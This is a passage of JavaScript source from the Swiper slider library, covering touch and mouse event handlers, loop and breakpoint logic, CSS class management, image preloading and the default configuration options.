    if (slideChanged && diff !== 0) {
      swiper.setTranslate((rtl ? -swiper.translate : swiper.translate) - diff);
    }
  }

  swiper.allowSlidePrev = allowSlidePrev;
  swiper.allowSlideNext = allowSlideNext;
  swiper.emit('loopFix');
}

function loopDestroy() {
  const swiper = this;
  const {
    $wrapperEl,
    params,
    slides
  } = swiper;
  $wrapperEl.children(`.${params.slideClass}.${params.slideDuplicateClass},.${params.slideClass}.${params.slideBlankClass}`).remove();
  slides.removeAttr('data-swiper-slide-index');
}

var loop = {
  loopCreate,
  loopFix,
  loopDestroy
};

function setGrabCursor(moving) {
  const swiper = this;
  if (swiper.support.touch || !swiper.params.simulateTouch || swiper.params.watchOverflow && swiper.isLocked || swiper.params.cssMode) return;
  const el = swiper.params.touchEventsTarget === 'container' ? swiper.el : swiper.wrapperEl;
  el.style.cursor = 'move';
  el.style.cursor = moving ? 'grabbing' : 'grab';
}

function unsetGrabCursor() {
  const swiper = this;

  if (swiper.support.touch || swiper.params.watchOverflow && swiper.isLocked || swiper.params.cssMode) {
    return;
  }

  swiper[swiper.params.touchEventsTarget === 'container' ? 'el' : 'wrapperEl'].style.cursor = '';
}

var grabCursor = {
  setGrabCursor,
  unsetGrabCursor
};

function closestElement(selector, base = this) {
  function __closestFrom(el) {
    if (!el || el === getDocument() || el === getWindow()) return null;
    if (el.assignedSlot) el = el.assignedSlot;
    const found = el.closest(selector);

    if (!found && !el.getRootNode) {
      return null;
    }

    return found || __closestFrom(el.getRootNode().host);
  }

  return __closestFrom(base);
}

function onTouchStart(event) {
  const swiper = this;
  const document = getDocument();
  const window = getWindow();
  const data = swiper.touchEventsData;
  const {
    params,
    touches,
    enabled
  } = swiper;
  if (!enabled) return;

  if (swiper.animating && params.preventInteractionOnTransition) {
    return;
  }

  if (!swiper.animating && params.cssMode && params.loop) {
    swiper.loopFix();
  }

  let e = event;
  if (e.originalEvent) e = e.originalEvent;
  let $targetEl = $(e.target);

  if (params.touchEventsTarget === 'wrapper') {
    if (!$targetEl.closest(swiper.wrapperEl).length) return;
  }

  data.isTouchEvent = e.type === 'touchstart';
  if (!data.isTouchEvent && 'which' in e && e.which === 3) return;
  if (!data.isTouchEvent && 'button' in e && e.button > 0) return;
  if (data.isTouched && data.isMoved) return; // change target el for shadow root component

  const swipingClassHasValue = !!params.noSwipingClass && params.noSwipingClass !== ''; // eslint-disable-next-line

  const eventPath = event.composedPath ? event.composedPath() : event.path;

  if (swipingClassHasValue && e.target && e.target.shadowRoot && eventPath) {
    $targetEl = $(eventPath[0]);
  }

  const noSwipingSelector = params.noSwipingSelector ? params.noSwipingSelector : `.${params.noSwipingClass}`;
  const isTargetShadow = !!(e.target && e.target.shadowRoot); // use closestElement for shadow root element to get the actual closest for nested shadow root element

  if (params.noSwiping && (isTargetShadow ? closestElement(noSwipingSelector, $targetEl[0]) : $targetEl.closest(noSwipingSelector)[0])) {
    swiper.allowClick = true;
    return;
  }

  if (params.swipeHandler) {
    if (!$targetEl.closest(params.swipeHandler)[0]) return;
  }

  touches.currentX = e.type === 'touchstart' ? e.targetTouches[0].pageX : e.pageX;
  touches.currentY = e.type === 'touchstart' ? e.targetTouches[0].pageY : e.pageY;
  const startX = touches.currentX;
  const startY = touches.currentY; // Do NOT start if iOS edge swipe is detected. Otherwise iOS app cannot swipe-to-go-back anymore

  const edgeSwipeDetection = params.edgeSwipeDetection || params.iOSEdgeSwipeDetection;
  const edgeSwipeThreshold = params.edgeSwipeThreshold || params.iOSEdgeSwipeThreshold;

  if (edgeSwipeDetection && (startX <= edgeSwipeThreshold || startX >= window.innerWidth - edgeSwipeThreshold)) {
    if (edgeSwipeDetection === 'prevent') {
      event.preventDefault();
    } else {
      return;
    }
  }

  Object.assign(data, {
    isTouched: true,
    isMoved: false,
    allowTouchCallbacks: true,
    isScrolling: undefined,
    startMoving: undefined
  });
  touches.startX = startX;
  touches.startY = startY;
  data.touchStartTime = now();
  swiper.allowClick = true;
  swiper.updateSize();
  swiper.swipeDirection = undefined;
  if (params.threshold > 0) data.allowThresholdMove = false;

  if (e.type !== 'touchstart') {
    let preventDefault = true;

    if ($targetEl.is(data.focusableElements)) {
      preventDefault = false;

      if ($targetEl[0].nodeName === 'SELECT') {
        data.isTouched = false;
      }
    }

    if (document.activeElement && $(document.activeElement).is(data.focusableElements) && document.activeElement !== $targetEl[0]) {
      document.activeElement.blur();
    }

    const shouldPreventDefault = preventDefault && swiper.allowTouchMove && params.touchStartPreventDefault;

    if ((params.touchStartForcePreventDefault || shouldPreventDefault) && !$targetEl[0].isContentEditable) {
      e.preventDefault();
    }
  }

  if (swiper.params.freeMode && swiper.params.freeMode.enabled && swiper.freeMode && swiper.animating && !params.cssMode) {
    swiper.freeMode.onTouchStart();
  }

  swiper.emit('touchStart', e);
}

function onTouchMove(event) {
  const document = getDocument();
  const swiper = this;
  const data = swiper.touchEventsData;
  const {
    params,
    touches,
    rtlTranslate: rtl,
    enabled
  } = swiper;
  if (!enabled) return;
  let e = event;
  if (e.originalEvent) e = e.originalEvent;

  if (!data.isTouched) {
    if (data.startMoving && data.isScrolling) {
      swiper.emit('touchMoveOpposite', e);
    }

    return;
  }

  if (data.isTouchEvent && e.type !== 'touchmove') return;
  const targetTouch = e.type === 'touchmove' && e.targetTouches && (e.targetTouches[0] || e.changedTouches[0]);
  const pageX = e.type === 'touchmove' ? targetTouch.pageX : e.pageX;
  const pageY = e.type === 'touchmove' ? targetTouch.pageY : e.pageY;

  if (e.preventedByNestedSwiper) {
    touches.startX = pageX;
    touches.startY = pageY;
    return;
  }

  if (!swiper.allowTouchMove) {
    if (!$(e.target).is(data.focusableElements)) {
      swiper.allowClick = false;
    }

    if (data.isTouched) {
      Object.assign(touches, {
        startX: pageX,
        startY: pageY,
        currentX: pageX,
        currentY: pageY
      });
      data.touchStartTime = now();
    }

    return;
  }

  if (data.isTouchEvent && params.touchReleaseOnEdges && !params.loop) {
    if (swiper.isVertical()) {
      // Vertical
      if (pageY < touches.startY && swiper.translate <= swiper.maxTranslate() || pageY > touches.startY && swiper.translate >= swiper.minTranslate()) {
        data.isTouched = false;
        data.isMoved = false;
        return;
      }
    } else if (pageX < touches.startX && swiper.translate <= swiper.maxTranslate() || pageX > touches.startX && swiper.translate >= swiper.minTranslate()) {
      return;
    }
  }

  if (data.isTouchEvent && document.activeElement) {
    if (e.target === document.activeElement && $(e.target).is(data.focusableElements)) {
      data.isMoved = true;
      swiper.allowClick = false;
      return;
    }
  }

  if (data.allowTouchCallbacks) {
    swiper.emit('touchMove', e);
  }

  if (e.targetTouches && e.targetTouches.length > 1) return;
  touches.currentX = pageX;
  touches.currentY = pageY;
  const diffX = touches.currentX - touches.startX;
  const diffY = touches.currentY - touches.startY;
  if (swiper.params.threshold && Math.sqrt(diffX ** 2 + diffY ** 2) < swiper.params.threshold) return;

  if (typeof data.isScrolling === 'undefined') {
    let touchAngle;

    if (swiper.isHorizontal() && touches.currentY === touches.startY || swiper.isVertical() && touches.currentX === touches.startX) {
      data.isScrolling = false;
    } else {
      // eslint-disable-next-line
      if (diffX * diffX + diffY * diffY >= 25) {
        touchAngle = Math.atan2(Math.abs(diffY), Math.abs(diffX)) * 180 / Math.PI;
        data.isScrolling = swiper.isHorizontal() ? touchAngle > params.touchAngle : 90 - touchAngle > params.touchAngle;
      }
    }
  }

  if (data.isScrolling) {
    swiper.emit('touchMoveOpposite', e);
  }

  if (typeof data.startMoving === 'undefined') {
    if (touches.currentX !== touches.startX || touches.currentY !== touches.startY) {
      data.startMoving = true;
    }
  }

  if (data.isScrolling) {
    data.isTouched = false;
    return;
  }

  if (!data.startMoving) {
    return;
  }

  swiper.allowClick = false;

  if (!params.cssMode && e.cancelable) {
    e.preventDefault();
  }

  if (params.touchMoveStopPropagation && !params.nested) {
    e.stopPropagation();
  }

  if (!data.isMoved) {
    if (params.loop && !params.cssMode) {
      swiper.loopFix();
    }

    data.startTranslate = swiper.getTranslate();
    swiper.setTransition(0);

    if (swiper.animating) {
      swiper.$wrapperEl.trigger('webkitTransitionEnd transitionend');
    }

    data.allowMomentumBounce = false; // Grab Cursor

    if (params.grabCursor && (swiper.allowSlideNext === true || swiper.allowSlidePrev === true)) {
      swiper.setGrabCursor(true);
    }

    swiper.emit('sliderFirstMove', e);
  }

  swiper.emit('sliderMove', e);
  data.isMoved = true;
  let diff = swiper.isHorizontal() ? diffX : diffY;
  touches.diff = diff;
  diff *= params.touchRatio;
  if (rtl) diff = -diff;
  swiper.swipeDirection = diff > 0 ? 'prev' : 'next';
  data.currentTranslate = diff + data.startTranslate;
  let disableParentSwiper = true;
  let resistanceRatio = params.resistanceRatio;

  if (params.touchReleaseOnEdges) {
    resistanceRatio = 0;
  }

  if (diff > 0 && data.currentTranslate > swiper.minTranslate()) {
    disableParentSwiper = false;
    if (params.resistance) data.currentTranslate = swiper.minTranslate() - 1 + (-swiper.minTranslate() + data.startTranslate + diff) ** resistanceRatio;
  } else if (diff < 0 && data.currentTranslate < swiper.maxTranslate()) {
    disableParentSwiper = false;
    if (params.resistance) data.currentTranslate = swiper.maxTranslate() + 1 - (swiper.maxTranslate() - data.startTranslate - diff) ** resistanceRatio;
  }

  if (disableParentSwiper) {
    e.preventedByNestedSwiper = true;
  } // Directions locks


  if (!swiper.allowSlideNext && swiper.swipeDirection === 'next' && data.currentTranslate < data.startTranslate) {
    data.currentTranslate = data.startTranslate;
  }

  if (!swiper.allowSlidePrev && swiper.swipeDirection === 'prev' && data.currentTranslate > data.startTranslate) {
    data.currentTranslate = data.startTranslate;
  }

  if (!swiper.allowSlidePrev && !swiper.allowSlideNext) {
    data.currentTranslate = data.startTranslate;
  } // Threshold


  if (params.threshold > 0) {
    if (Math.abs(diff) > params.threshold || data.allowThresholdMove) {
      if (!data.allowThresholdMove) {
        data.allowThresholdMove = true;
        touches.startX = touches.currentX;
        touches.startY = touches.currentY;
        data.currentTranslate = data.startTranslate;
        touches.diff = swiper.isHorizontal() ? touches.currentX - touches.startX : touches.currentY - touches.startY;
        return;
      }
    } else {
      data.currentTranslate = data.startTranslate;
      return;
    }
  }

  if (!params.followFinger || params.cssMode) return; // Update active index in free mode

  if (params.freeMode && params.freeMode.enabled && swiper.freeMode || params.watchSlidesProgress) {
    swiper.updateActiveIndex();
    swiper.updateSlidesClasses();
  }

  if (swiper.params.freeMode && params.freeMode.enabled && swiper.freeMode) {
    swiper.freeMode.onTouchMove();
  } // Update progress


  swiper.updateProgress(data.currentTranslate); // Update translate

  swiper.setTranslate(data.currentTranslate);
}

function onTouchEnd(event) {
  const swiper = this;
  const data = swiper.touchEventsData;
  const {
    params,
    touches,
    rtlTranslate: rtl,
    slidesGrid,
    enabled
  } = swiper;
  if (!enabled) return;
  let e = event;
  if (e.originalEvent) e = e.originalEvent;

  if (data.allowTouchCallbacks) {
    swiper.emit('touchEnd', e);
  }

  data.allowTouchCallbacks = false;

  if (!data.isTouched) {
    if (data.isMoved && params.grabCursor) {
      swiper.setGrabCursor(false);
    }

    data.isMoved = false;
    data.startMoving = false;
    return;
  } // Return Grab Cursor


  if (params.grabCursor && data.isMoved && data.isTouched && (swiper.allowSlideNext === true || swiper.allowSlidePrev === true)) {
    swiper.setGrabCursor(false);
  } // Time diff


  const touchEndTime = now();
  const timeDiff = touchEndTime - data.touchStartTime; // Tap, doubleTap, Click

  if (swiper.allowClick) {
    const pathTree = e.path || e.composedPath && e.composedPath();
    swiper.updateClickedSlide(pathTree && pathTree[0] || e.target);
    swiper.emit('tap click', e);

    if (timeDiff < 300 && touchEndTime - data.lastClickTime < 300) {
      swiper.emit('doubleTap doubleClick', e);
    }
  }

  data.lastClickTime = now();
  nextTick(() => {
    if (!swiper.destroyed) swiper.allowClick = true;
  });

  if (!data.isTouched || !data.isMoved || !swiper.swipeDirection || touches.diff === 0 || data.currentTranslate === data.startTranslate) {
    data.isTouched = false;
    data.isMoved = false;
    data.startMoving = false;
    return;
  }

  data.isTouched = false;
  data.isMoved = false;
  data.startMoving = false;
  let currentPos;

  if (params.followFinger) {
    currentPos = rtl ? swiper.translate : -swiper.translate;
  } else {
    currentPos = -data.currentTranslate;
  }

  if (params.cssMode) {
    return;
  }

  if (swiper.params.freeMode && params.freeMode.enabled) {
    swiper.freeMode.onTouchEnd({
      currentPos
    });
    return;
  } // Find current slide


  let stopIndex = 0;
  let groupSize = swiper.slidesSizesGrid[0];

  for (let i = 0; i < slidesGrid.length; i += i < params.slidesPerGroupSkip ? 1 : params.slidesPerGroup) {
    const increment = i < params.slidesPerGroupSkip - 1 ? 1 : params.slidesPerGroup;

    if (typeof slidesGrid[i + increment] !== 'undefined') {
      if (currentPos >= slidesGrid[i] && currentPos < slidesGrid[i + increment]) {
        stopIndex = i;
        groupSize = slidesGrid[i + increment] - slidesGrid[i];
      }
    } else if (currentPos >= slidesGrid[i]) {
      stopIndex = i;
      groupSize = slidesGrid[slidesGrid.length - 1] - slidesGrid[slidesGrid.length - 2];
    }
  }

  let rewindFirstIndex = null;
  let rewindLastIndex = null;

  if (params.rewind) {
    if (swiper.isBeginning) {
      rewindLastIndex = swiper.params.virtual && swiper.params.virtual.enabled && swiper.virtual ? swiper.virtual.slides.length - 1 : swiper.slides.length - 1;
    } else if (swiper.isEnd) {
      rewindFirstIndex = 0;
    }
  } // Find current slide size


  const ratio = (currentPos - slidesGrid[stopIndex]) / groupSize;
  const increment = stopIndex < params.slidesPerGroupSkip - 1 ? 1 : params.slidesPerGroup;

  if (timeDiff > params.longSwipesMs) {
    // Long touches
    if (!params.longSwipes) {
      swiper.slideTo(swiper.activeIndex);
      return;
    }

    if (swiper.swipeDirection === 'next') {
      if (ratio >= params.longSwipesRatio) swiper.slideTo(params.rewind && swiper.isEnd ? rewindFirstIndex : stopIndex + increment);else swiper.slideTo(stopIndex);
    }

    if (swiper.swipeDirection === 'prev') {
      if (ratio > 1 - params.longSwipesRatio) {
        swiper.slideTo(stopIndex + increment);
      } else if (rewindLastIndex !== null && ratio < 0 && Math.abs(ratio) > params.longSwipesRatio) {
        swiper.slideTo(rewindLastIndex);
      } else {
        swiper.slideTo(stopIndex);
      }
    }
  } else {
    // Short swipes
    if (!params.shortSwipes) {
      swiper.slideTo(swiper.activeIndex);
      return;
    }

    const isNavButtonTarget = swiper.navigation && (e.target === swiper.navigation.nextEl || e.target === swiper.navigation.prevEl);

    if (!isNavButtonTarget) {
      if (swiper.swipeDirection === 'next') {
        swiper.slideTo(rewindFirstIndex !== null ? rewindFirstIndex : stopIndex + increment);
      }

      if (swiper.swipeDirection === 'prev') {
        swiper.slideTo(rewindLastIndex !== null ? rewindLastIndex : stopIndex);
      }
    } else if (e.target === swiper.navigation.nextEl) {
      swiper.slideTo(stopIndex + increment);
    } else {
      swiper.slideTo(stopIndex);
    }
  }
}

function onResize() {
  const swiper = this;
  const {
    params,
    el
  } = swiper;
  if (el && el.offsetWidth === 0) return; // Breakpoints

  if (params.breakpoints) {
    swiper.setBreakpoint();
  } // Save locks


  const {
    allowSlideNext,
    allowSlidePrev,
    snapGrid
  } = swiper; // Disable locks on resize

  swiper.allowSlideNext = true;
  swiper.allowSlidePrev = true;
  swiper.updateSize();
  swiper.updateSlides();
  swiper.updateSlidesClasses();

  if ((params.slidesPerView === 'auto' || params.slidesPerView > 1) && swiper.isEnd && !swiper.isBeginning && !swiper.params.centeredSlides) {
    swiper.slideTo(swiper.slides.length - 1, 0, false, true);
  } else {
    swiper.slideTo(swiper.activeIndex, 0, false, true);
  }

  if (swiper.autoplay && swiper.autoplay.running && swiper.autoplay.paused) {
    swiper.autoplay.run();
  } // Return locks after resize


  swiper.allowSlidePrev = allowSlidePrev;
  swiper.allowSlideNext = allowSlideNext;

  if (swiper.params.watchOverflow && snapGrid !== swiper.snapGrid) {
    swiper.checkOverflow();
  }
}

function onClick(e) {
  const swiper = this;
  if (!swiper.enabled) return;

  if (!swiper.allowClick) {
    if (swiper.params.preventClicks) e.preventDefault();

    if (swiper.params.preventClicksPropagation && swiper.animating) {
      e.stopPropagation();
      e.stopImmediatePropagation();
    }
  }
}

function onScroll() {
  const swiper = this;
  const {
    wrapperEl,
    rtlTranslate,
    enabled
  } = swiper;
  if (!enabled) return;
  swiper.previousTranslate = swiper.translate;

  if (swiper.isHorizontal()) {
    swiper.translate = -wrapperEl.scrollLeft;
  } else {
    swiper.translate = -wrapperEl.scrollTop;
  } // eslint-disable-next-line


  if (swiper.translate === 0) swiper.translate = 0;
  swiper.updateActiveIndex();
  swiper.updateSlidesClasses();
  let newProgress;
  const translatesDiff = swiper.maxTranslate() - swiper.minTranslate();

  if (translatesDiff === 0) {
    newProgress = 0;
  } else {
    newProgress = (swiper.translate - swiper.minTranslate()) / translatesDiff;
  }

  if (newProgress !== swiper.progress) {
    swiper.updateProgress(rtlTranslate ? -swiper.translate : swiper.translate);
  }

  swiper.emit('setTranslate', swiper.translate, false);
}

let dummyEventAttached = false;

function dummyEventListener() {}

const events = (swiper, method) => {
  const document = getDocument();
  const {
    params,
    touchEvents,
    el,
    wrapperEl,
    device,
    support
  } = swiper;
  const capture = !!params.nested;
  const domMethod = method === 'on' ? 'addEventListener' : 'removeEventListener';
  const swiperMethod = method; // Touch Events

  if (!support.touch) {
    el[domMethod](touchEvents.start, swiper.onTouchStart, false);
    document[domMethod](touchEvents.move, swiper.onTouchMove, capture);
    document[domMethod](touchEvents.end, swiper.onTouchEnd, false);
  } else {
    const passiveListener = touchEvents.start === 'touchstart' && support.passiveListener && params.passiveListeners ? {
      passive: true,
      capture: false
    } : false;
    el[domMethod](touchEvents.start, swiper.onTouchStart, passiveListener);
    el[domMethod](touchEvents.move, swiper.onTouchMove, support.passiveListener ? {
      passive: false,
      capture
    } : capture);
    el[domMethod](touchEvents.end, swiper.onTouchEnd, passiveListener);

    if (touchEvents.cancel) {
      el[domMethod](touchEvents.cancel, swiper.onTouchEnd, passiveListener);
    }
  } // Prevent Links Clicks


  if (params.preventClicks || params.preventClicksPropagation) {
    el[domMethod]('click', swiper.onClick, true);
  }

  if (params.cssMode) {
    wrapperEl[domMethod]('scroll', swiper.onScroll);
  } // Resize handler


  if (params.updateOnWindowResize) {
    swiper[swiperMethod](device.ios || device.android ? 'resize orientationchange observerUpdate' : 'resize observerUpdate', onResize, true);
  } else {
    swiper[swiperMethod]('observerUpdate', onResize, true);
  }
};

function attachEvents() {
  const swiper = this;
  const document = getDocument();
  const {
    params,
    support
  } = swiper;
  swiper.onTouchStart = onTouchStart.bind(swiper);
  swiper.onTouchMove = onTouchMove.bind(swiper);
  swiper.onTouchEnd = onTouchEnd.bind(swiper);

  if (params.cssMode) {
    swiper.onScroll = onScroll.bind(swiper);
  }

  swiper.onClick = onClick.bind(swiper);

  if (support.touch && !dummyEventAttached) {
    document.addEventListener('touchstart', dummyEventListener);
    dummyEventAttached = true;
  }

  events(swiper, 'on');
}

function detachEvents() {
  const swiper = this;
  events(swiper, 'off');
}

var events$1 = {
  attachEvents,
  detachEvents
};

const isGridEnabled = (swiper, params) => {
  return swiper.grid && params.grid && params.grid.rows > 1;
};

function setBreakpoint() {
  const swiper = this;
  const {
    activeIndex,
    initialized,
    loopedSlides = 0,
    params,
    $el
  } = swiper;
  const breakpoints = params.breakpoints;
  if (!breakpoints || breakpoints && Object.keys(breakpoints).length === 0) return; // Get breakpoint for window width and update parameters

  const breakpoint = swiper.getBreakpoint(breakpoints, swiper.params.breakpointsBase, swiper.el);
  if (!breakpoint || swiper.currentBreakpoint === breakpoint) return;
  const breakpointOnlyParams = breakpoint in breakpoints ? breakpoints[breakpoint] : undefined;
  const breakpointParams = breakpointOnlyParams || swiper.originalParams;
  const wasMultiRow = isGridEnabled(swiper, params);
  const isMultiRow = isGridEnabled(swiper, breakpointParams);
  const wasEnabled = params.enabled;

  if (wasMultiRow && !isMultiRow) {
    $el.removeClass(`${params.containerModifierClass}grid ${params.containerModifierClass}grid-column`);
    swiper.emitContainerClasses();
  } else if (!wasMultiRow && isMultiRow) {
    $el.addClass(`${params.containerModifierClass}grid`);

    if (breakpointParams.grid.fill && breakpointParams.grid.fill === 'column' || !breakpointParams.grid.fill && params.grid.fill === 'column') {
      $el.addClass(`${params.containerModifierClass}grid-column`);
    }

    swiper.emitContainerClasses();
  } // Toggle navigation, pagination, scrollbar


  ['navigation', 'pagination', 'scrollbar'].forEach(prop => {
    const wasModuleEnabled = params[prop] && params[prop].enabled;
    const isModuleEnabled = breakpointParams[prop] && breakpointParams[prop].enabled;

    if (wasModuleEnabled && !isModuleEnabled) {
      swiper[prop].disable();
    }

    if (!wasModuleEnabled && isModuleEnabled) {
      swiper[prop].enable();
    }
  });
  const directionChanged = breakpointParams.direction && breakpointParams.direction !== params.direction;
  const needsReLoop = params.loop && (breakpointParams.slidesPerView !== params.slidesPerView || directionChanged);

  if (directionChanged && initialized) {
    swiper.changeDirection();
  }

  extend$1(swiper.params, breakpointParams);
  const isEnabled = swiper.params.enabled;
  Object.assign(swiper, {
    allowTouchMove: swiper.params.allowTouchMove,
    allowSlideNext: swiper.params.allowSlideNext,
    allowSlidePrev: swiper.params.allowSlidePrev
  });

  if (wasEnabled && !isEnabled) {
    swiper.disable();
  } else if (!wasEnabled && isEnabled) {
    swiper.enable();
  }

  swiper.currentBreakpoint = breakpoint;
  swiper.emit('_beforeBreakpoint', breakpointParams);

  if (needsReLoop && initialized) {
    swiper.loopDestroy();
    swiper.loopCreate();
    swiper.updateSlides();
    swiper.slideTo(activeIndex - loopedSlides + swiper.loopedSlides, 0, false);
  }

  swiper.emit('breakpoint', breakpointParams);
}

function getBreakpoint(breakpoints, base = 'window', containerEl) {
  if (!breakpoints || base === 'container' && !containerEl) return undefined;
  let breakpoint = false;
  const window = getWindow();
  const currentHeight = base === 'window' ? window.innerHeight : containerEl.clientHeight;
  const points = Object.keys(breakpoints).map(point => {
    if (typeof point === 'string' && point.indexOf('@') === 0) {
      const minRatio = parseFloat(point.substr(1));
      const value = currentHeight * minRatio;
      return {
        value,
        point
      };
    }

    return {
      value: point,
      point
    };
  });
  points.sort((a, b) => parseInt(a.value, 10) - parseInt(b.value, 10));

  for (let i = 0; i < points.length; i += 1) {
    const {
      point,
      value
    } = points[i];

    if (base === 'window') {
      if (window.matchMedia(`(min-width: ${value}px)`).matches) {
        breakpoint = point;
      }
    } else if (value <= containerEl.clientWidth) {
      breakpoint = point;
    }
  }

  return breakpoint || 'max';
}

var breakpoints = {
  setBreakpoint,
  getBreakpoint
};

function prepareClasses(entries, prefix) {
  const resultClasses = [];
  entries.forEach(item => {
    if (typeof item === 'object') {
      Object.keys(item).forEach(classNames => {
        if (item[classNames]) {
          resultClasses.push(prefix + classNames);
        }
      });
    } else if (typeof item === 'string') {
      resultClasses.push(prefix + item);
    }
  });
  return resultClasses;
}

function addClasses() {
  const swiper = this;
  const {
    classNames,
    params,
    rtl,
    $el,
    device,
    support
  } = swiper; // prettier-ignore

  const suffixes = prepareClasses(['initialized', params.direction, {
    'pointer-events': !support.touch
  }, {
    'free-mode': swiper.params.freeMode && params.freeMode.enabled
  }, {
    'autoheight': params.autoHeight
  }, {
    'rtl': rtl
  }, {
    'grid': params.grid && params.grid.rows > 1
  }, {
    'grid-column': params.grid && params.grid.rows > 1 && params.grid.fill === 'column'
  }, {
    'android': device.android
  }, {
    'ios': device.ios
  }, {
    'css-mode': params.cssMode
  }, {
    'centered': params.cssMode && params.centeredSlides
  }, {
    'watch-progress': params.watchSlidesProgress
  }], params.containerModifierClass);
  classNames.push(...suffixes);
  $el.addClass([...classNames].join(' '));
  swiper.emitContainerClasses();
}

function removeClasses() {
  const swiper = this;
  const {
    $el,
    classNames
  } = swiper;
  $el.removeClass(classNames.join(' '));
  swiper.emitContainerClasses();
}

var classes = {
  addClasses,
  removeClasses
};

function loadImage(imageEl, src, srcset, sizes, checkForComplete, callback) {
  const window = getWindow();
  let image;

  function onReady() {
    if (callback) callback();
  }

  const isPicture = $(imageEl).parent('picture')[0];

  if (!isPicture && (!imageEl.complete || !checkForComplete)) {
    if (src) {
      image = new window.Image();
      image.onload = onReady;
      image.onerror = onReady;

      if (sizes) {
        image.sizes = sizes;
      }

      if (srcset) {
        image.srcset = srcset;
      }

      if (src) {
        image.src = src;
      }
    } else {
      onReady();
    }
  } else {
    // image already loaded...
    onReady();
  }
}

function preloadImages() {
  const swiper = this;
  swiper.imagesToLoad = swiper.$el.find('img');

  function onReady() {
    if (typeof swiper === 'undefined' || swiper === null || !swiper || swiper.destroyed) return;
    if (swiper.imagesLoaded !== undefined) swiper.imagesLoaded += 1;

    if (swiper.imagesLoaded === swiper.imagesToLoad.length) {
      if (swiper.params.updateOnImagesReady) swiper.update();
      swiper.emit('imagesReady');
    }
  }

  for (let i = 0; i < swiper.imagesToLoad.length; i += 1) {
    const imageEl = swiper.imagesToLoad[i];
    swiper.loadImage(imageEl, imageEl.currentSrc || imageEl.getAttribute('src'), imageEl.srcset || imageEl.getAttribute('srcset'), imageEl.sizes || imageEl.getAttribute('sizes'), true, onReady);
  }
}

var images = {
  loadImage,
  preloadImages
};

function checkOverflow() {
  const swiper = this;
  const {
    isLocked: wasLocked,
    params
  } = swiper;
  const {
    slidesOffsetBefore
  } = params;

  if (slidesOffsetBefore) {
    const lastSlideIndex = swiper.slides.length - 1;
    const lastSlideRightEdge = swiper.slidesGrid[lastSlideIndex] + swiper.slidesSizesGrid[lastSlideIndex] + slidesOffsetBefore * 2;
    swiper.isLocked = swiper.size > lastSlideRightEdge;
  } else {
    swiper.isLocked = swiper.snapGrid.length === 1;
  }

  if (params.allowSlideNext === true) {
    swiper.allowSlideNext = !swiper.isLocked;
  }

  if (params.allowSlidePrev === true) {
    swiper.allowSlidePrev = !swiper.isLocked;
  }

  if (wasLocked && wasLocked !== swiper.isLocked) {
    swiper.isEnd = false;
  }

  if (wasLocked !== swiper.isLocked) {
    swiper.emit(swiper.isLocked ? 'lock' : 'unlock');
  }
}

var checkOverflow$1 = {
  checkOverflow
};

var defaults = {
  init: true,
  direction: 'horizontal',
  touchEventsTarget: 'wrapper',
  initialSlide: 0,
  speed: 300,
  cssMode: false,
  updateOnWindowResize: true,
  resizeObserver: true,
  nested: false,
  createElements: false,
  enabled: true,
  focusableElements: 'input, select, option, textarea, button, video, label',
  // Overrides
  width: null,
  height: null,
  //
  preventInteractionOnTransition: false,
  // ssr
  userAgent: null,
  url: null,
  // To support iOS's swipe-to-go-back gesture (when being used in-app).
  edgeSwipeDetection: false,
  edgeSwipeThreshold: 20,
  // Autoheight
  autoHeight: false,
  // Set wrapper width
  setWrapperSize: false,
  // Virtual Translate
  virtualTranslate: false,
  // Effects
  effect: 'slide',
  // 'slide' or 'fade' or 'cube' or 'coverflow' or 'flip'
  // Breakpoints
  breakpoints: undefined,
  breakpointsBase: 'window',
  // Slides grid
  spaceBetween: 0,
  slidesPerView: 1,
  slidesPerGroup: 1,
  slidesPerGroupSkip: 0,
  slidesPerGroupAuto: false,
  centeredSlides: false,
  centeredSlidesBounds: false,
  slidesOffsetBefore: 0,
  // in px
  slidesOffsetAfter: 0,
  // in px
  normalizeSlideIndex: true,
  centerInsufficientSlides: false,
  // Disable swiper and hide navigation when container not overflow
  watchOverflow: true,
  // Round length
  roundLengths: false,
  // Touches
  touchRatio: 1,
  touchAngle: 45,
  simulateTouch: true,
  shortSwipes: true,
  longSwipes: true,
  longSwipesRatio: 0.5,
  longSwipesMs: 300,
  followFinger: true,
  allowTouchMove: true,
  threshold: 0,
  touchMoveStopPropagation: false,
  touchStartPreventDefault: true,
  touchStartForcePreventDefault: false,
  touchReleaseOnEdges: false,
  // Unique Navigation Elements
  uniqueNavElements: true,
  // Resistance
  resistance: true,
  resistanceRatio: 0.85,
  // Progress
  watchSlidesProgress: false,
  // Cursor
  grabCursor: false,
  // Clicks
  preventClicks: true,
  preventClicksPropagation: true,
  slideToClickedSlide: false,
  // Images
  preloadImages: true,
  updateOnImagesReady: true,
  // loop
  loop: false,
  loopAdditionalSlides: 0,
  loopedSlides: null,
  loopedSlidesLimit: true,
  loopFillGroupWithBlank: false,
  loopPreventsSlide: true,
  // rewind
  rewind: false,
  // Swiping/no swiping
  allowSlidePrev: true,
  allowSlideNext: true,
  swipeHandler: null,
  // '.swipe-handler',
  noSwiping: true,
  noSwipingClass: 'swiper-no-swiping',
  noSwipingSelector: null,
  // Passive Listeners
  passiveListeners: true,
  maxBackfaceHiddenSlides: 10,
  // NS
  containerModifierClass: 'swiper-',
  // NEW
  slideClass: 'swiper-slide',
  slideBlankClass: 'swiper-slide-invisible-blank',
  slideActiveClass: 'swiper-slide-active',
  slideDuplicateActiveClass: 'swiper-slide-duplicate-active',
  slideVisibleClass: 'swiper-slide-visible',
  slideDuplicateClass: 'swiper-slide-duplicate',
  slideNextClass: 'swiper-slide-next',
  slideDuplicateNextClass: 'swiper-slide-duplicate-next',
  slidePrevClass: 'swiper-slide-prev',
  slideDuplicatePrevClass: 'swiper-slide-duplicate-prev',
  wrapperClass: 'swiper-wrapper',
  // Callbacks
  runCallbacksOnInit: true,
  // Internals
  _emitClasses: false
};

function moduleExtendParams(params, allModulesParams) {
  return function extendParams(obj = {}) {
    const moduleParamName = Object.keys(obj)[0];
    const moduleParams = obj[moduleParamName];

    if (typeof moduleParams !== 'object' || moduleParams === null) {
      extend$1(allModulesParams, obj);
      return;
    }

    if (['navigation', 'pagination', 'scrollbar'].indexOf(moduleParamName) >= 0 && params[moduleParamName] === true) {
      params[moduleParamName] = {
        auto: true
      };
    }

    if (!(moduleParamName in params && 'enabled' in moduleParams)) {
      extend$1(allModulesParams, obj);
      return;
    }

    if (params[moduleParamName] === true) {
      params[moduleParamName] = {
        enabled: true
      };
    }

